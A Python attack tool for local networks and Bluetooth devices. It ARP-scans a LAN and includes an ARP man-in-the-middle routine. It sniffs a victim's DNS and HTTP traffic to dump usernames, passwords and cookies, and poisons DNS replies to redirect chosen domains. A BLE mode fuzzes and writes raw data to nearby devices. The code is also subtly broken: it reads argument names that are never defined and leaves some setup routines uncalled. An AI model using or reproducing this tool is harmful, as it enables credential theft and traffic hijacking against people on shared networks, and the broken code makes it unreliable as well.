#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import os
import platform
import ctypes
import subprocess
import requests
import re
import urllib.parse
from prettytable import PrettyTable
from bleak import BleakScanner, BleakClient
import asyncio
import random

# Check platform and privileges
if platform.system() == "Windows":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
        exit(1)
elif platform.system() == "Linux":
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        exit(1)
else:
    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
    exit(1)

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('-n', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
parser.add_argument('-i', help='Network interface to use', required=True)
parser.add_argument('-r', help='IP of your home router', required=True)
parser.add_argument('-m', help='Mode: wifi or ble', required=True)
opts = parser.parse_args()

# DNS Spoofing for Multiple Targets
class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_dns(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53', store=0)

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def arp_sniff(self):
        def arp_pkt_callback(pkt):
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=arp_pkt_callback,
              filter=f'arp and host {self.targetip}', store=0)

    def http_sniff(self):
        def http_pkt_callback(pkt):
            if pkt.haslayer('Raw'):
                raw_data = pkt['Raw'].load.decode(errors='ignore')
                login_fields = ['heslo', 'passwd', 'pwd', 'user_id', 'pseudonym', 'phone',
                                'password', 'user', 'username', 'login', 'pass', 'uname','userPass']
                creds_found = {}
                url = "unknown"
                show_dump = False

                # Decode URL-encoded characters
                raw_data = urllib.parse.unquote(raw_data)

                # Extract Host and Path for full URL
                if "Host:" in raw_data and "GET" in raw_data:
                    try:
                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
                        path = raw_data.split("GET ")[1].split(" HTTP")[0]
                        url = f"http://{host}{path}"
                        print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
                    except Exception:
                        pass

                elif "Host:" in raw_data and "POST" in raw_data:
                    try:
                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
                        path = raw_data.split("POST ")[1].split(" HTTP")[0]
                        url = f"http://{host}{path}"
                    except Exception:
                        pass

                if "POST" in raw_data:
                    # Lowercase search for login keywords
                    for field in login_fields:
                        regex = re.compile(rf'{field}=([^&\s]+)', re.IGNORECASE)
                        match = regex.search(raw_data)
                        if match:
                            creds_found[field.lower()] = match.group(1)
                            show_dump = True

                    if show_dump:
                        login = "-"
                        pwd = "-"
                        for key in creds_found:
                            if key in ['user', 'username', 'login', 'uname', 'user_id', 'pseudonym', 'phone']:
                                login = creds_found[key]
                            if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
                                pwd = creds_found[key]

                        print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    IP: {self.targetip} > LOGIN: {login}  PWD: {pwd}  SITE: {url}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    CONTENT: {raw_data.strip().replace(chr(13), '').replace(chr(10), '')}{Style.RESET_ALL}")

                if "Set-Cookie:" in raw_data:
                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")

        sniff(iface=self.iface, prn=http_pkt_callback,
              filter=f'tcp port 80 and host {self.targetip}', store=0)

    def enable_ip_forwarding(self):
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')

    def set_iptables(self):
        subprocess.call(f"iptables --flush", shell=True)
        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')

    def dns_poison(self, spoof_ips):
        import netfilterqueue  # Import only when DNS poisoning is needed
        
        def dns_pkt_callback(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                target_ip = pkt[DNS].qd.qname.decode('utf-8').strip('.')
                if target_ip in spoof_ips:
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ips[target_ip]))
                    send(spoofed_pkt, iface=self.iface, verbose=False)
                    print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ips[target_ip]}{Style.RESET_ALL}')

        nfqueue = netfilterqueue.NetfilterQueue()
        nfqueue.bind(0, dns_pkt_callback)
        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
        nfqueue.run()

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
            try:
                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            except ValueError:
                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                continue
            if choice == 1:
                self.capture_dns()
            elif choice == 2:
                self.http_sniff()
            elif choice == 3:
                spoof_ips = {}
                while True:
                    target = input(f'{Fore.RED}Enter target domain (or "done" to finish): {Style.RESET_ALL}')
                    if target == "done":
                        break
                    ip = input(f'{Fore.RED}Enter spoofed IP for {target}: {Style.RESET_ALL}')
                    spoof_ips[target] = ip
                self.dns_poison(spoof_ips)
            elif choice == 4:
                self.arp_sniff()
            elif choice == 5:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                 timeout=5, iface=iface, verbose=False)
    devices = []
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        devices.append((ip, mac, vendor))
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
    return input('\nPick a device IP: ')

class BLEHandler:
    def __init__(self):
        self.devices = {}

    async def scan_start(self):
        print(f"[{strftime('%H:%M:%S')}] Starting BLE Recon...")
        devices = await BleakScanner.discover(timeout=20)
        for device in devices:
            mac = device.address
            rssi = device.rssi
            self.devices[mac] = {
                "name": device.name or "Unknown",
                "advertisement": device.metadata.get("manufacturer_data", {}),
                "last_seen": strftime('%Y-%m-%d %H:%M:%S'),
                "rssi": rssi
            }
            print(f"[{strftime('%H:%M:%S')}] New BLE device detected: {mac} ({rssi} dBm)")

    def show_devices(self):
        table = PrettyTable(["Device Name", "MAC Address", "Advertisement Data", "Last Seen"])
        for mac, info in self.devices.items():
            table.add_row([info["name"], mac, info["advertisement"], info["last_seen"]])
        print(table)

    async def enum_device(self, mac):
        print(f"Connecting to {mac}...")
        try:
            async with BleakClient(mac) as client:
                for service in client.services:
                    print(f"Service: {service.uuid}")
                    for characteristic in service.characteristics:
                        print(f"\tCharacteristic: {characteristic.uuid} (Properties: {characteristic.properties})")
        except Exception as e:
            print(f"Error: {e}")
            print(f"Disconnecting from {mac}...")


 
    async def fuzz(self, mac, uuid):
        try:
            async with BleakClient(mac) as client:
                malformed_data = bytes([random.randint(0, 255) for _ in range(16)])
                print(f"Sending malformed data to {uuid}: {malformed_data}")
                await client.write_gatt_char(uuid, malformed_data)
                print("Data sent successfully.")
        except Exception as e:
            print(f"Fuzzing failed: {e}")
            
    async def subscribe(self, mac, uuid):
        async def notification_handler(sender, data):
            print(f"Notification from {sender}: {data}")

        try:
            async with BleakClient(mac) as client:
                await client.start_notify(uuid, notification_handler)
                print(f"Subscribed to {uuid}, receiving live data...")
                await asyncio.sleep(30)
                await client.stop_notify(uuid)
        except Exception as e:
            print(f"Error during subscription: {e}")

    async def write_data(self, mac, uuid, data):
        try:
            async with BleakClient(mac) as client:
                await client.write_gatt_char(uuid, bytes.fromhex(data))
                print(f"Written data {data} to {uuid}")
        except Exception as e:
            print(f"Error during write: {e}")

    async def disconnect(self, mac):
        print(f"Disconnecting from {mac}...")
        # Bleak automatically disconnects when the client context ends.

def main():
    if opts.m == "wifi":
        while True:
            targetip = arp_scan(opts.network, opts.iface)
            if targetip == "0":
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            device = Device(opts.routerip, targetip, opts.iface)
            device.enable_ip_forwarding()
            try:
                device.sniff()
            except KeyboardInterrupt:
                print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
                continue
    elif opts.m == "ble":
        ble_handler = BLEHandler()
        while True:
            command = input("root@base~$ ")
            if command == "ble.scan start":
                asyncio.run(ble_handler.scan_start())
            elif command == "ble.show":
                ble_handler.show_devices()
            elif command.startswith("ble.enum"):
                _, mac = command.split()
                asyncio.run(ble_handler.enum_device(mac))
            elif command.startswith("ble.fuzz"):
                _, mac, uuid = command.split()
                asyncio.run(ble_handler.fuzz(mac, uuid))
            elif command.startswith("ble.subscribe"):
                _, mac, uuid = command.split()
                asyncio.run(ble_handler.subscribe(mac, uuid))
            elif command.startswith("ble.write"):
                _, mac, uuid, data = command.split()
                asyncio.run(ble_handler.write_data(mac, uuid, data))
            elif command.startswith("ble.disconnect"):
                _, mac = command.split()
                asyncio.run(ble_handler.disconnect(mac))
            elif command == "exit":
                break
            else:
                print(f"Unknown command: {command}")

if __name__ == "__main__":
    main()
